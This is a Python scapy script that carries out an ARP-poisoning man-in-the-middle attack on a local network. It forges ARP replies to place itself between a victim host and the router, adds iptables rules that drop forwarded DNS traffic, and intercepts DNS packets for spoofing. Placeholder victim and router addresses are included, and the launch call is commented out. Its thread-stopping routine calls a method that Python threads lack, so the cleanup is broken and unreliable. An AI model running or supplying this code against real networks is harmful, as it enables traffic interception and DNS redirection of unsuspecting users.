from scapy.all import *
from Forward import *
from DNS import *
import threading

def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
	return Ether(dst=rcv_mac) / ARP(
		op=2,
		psrc=res_ip,
		pdst=rcv_ip,
		hwsrc=res_mac,
		hwdst=rcv_mac
	)
	
def poison_loop(pkt, interface, interval):
	sendp(pkt, iface=interface, loop=1, inter=interval)
	
def start_arp_mitm(src_ip, src_mac, dst_ip, dst_mac, self_mac, interface):
	poison_src = forge_arp_response(src_ip, src_mac, dst_ip, self_mac)
	poison_dst = forge_arp_response(dst_ip, dst_mac, src_ip, self_mac)
    
	src_thread = threading.Thread(target=poison_loop, args=(poison_src, interface, 20), daemon=True)
	dst_thread = threading.Thread(target=poison_loop, args=(poison_dst, interface, 20), daemon=True) # todo add ways to customise intervals / interfaces
	
	src_thread.start()
	dst_thread.start()
	
	return [src_thread, dst_thread]

    # todo find good timings for sending poison/stealth mode(?) (base on OS?)

    
def stop_arp_mitm(threads):
	threads[0].stop()
	threads[1].stop()
	
def only_dns(pkt):
	if pkt.haslayer(UDP):
		if pkt.haslayer(DNS):
			print(pkt.summary())
			return True
	return False

def print_fn(pkt, victim_ip, router_ip, interface):
	print(pkt[Ether].src)
	print(pkt.summary())
	spoof_dns(pkt, victim_ip, router_ip, interface)
	
def start_attack(victim_ip, victim_mac, router_ip, router_mac, self_ip, self_mac, interface):
	enable_kernel_forwarding(interface)

	threads = start_arp_mitm(victim_ip, victim_mac, router_ip, router_mac , self_mac, interface)
		
	# Temp: make this function later	
	run("iptables -I FORWARD -p udp --dport 53 -j DROP")
	run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
		
	intercept_pkts(victim_ip, router_ip, self_mac, interface, only_dns, print_fn)

	input("\nstop")

	stop_arp_mitm(threads)
	cleanup_forward(interface)

# placeholder
victim_ip = "192.168.1.101"
victim_mac = "00:0c:29:20:af:e4"
router_ip = "192.168.1.1"
router_mac = "00:0c:29:94:84:aa"
self_ip = "192.168.1.102"
self_mac = "00:0c:29:97:ee:06"
interface = "eth0"

# start the attack with the placeholder values to avoid having to go through discovery every time for testing
# start_attack(victim_ip, victim_mac, router_ip, router_mac, self_ip, self_mac, interface)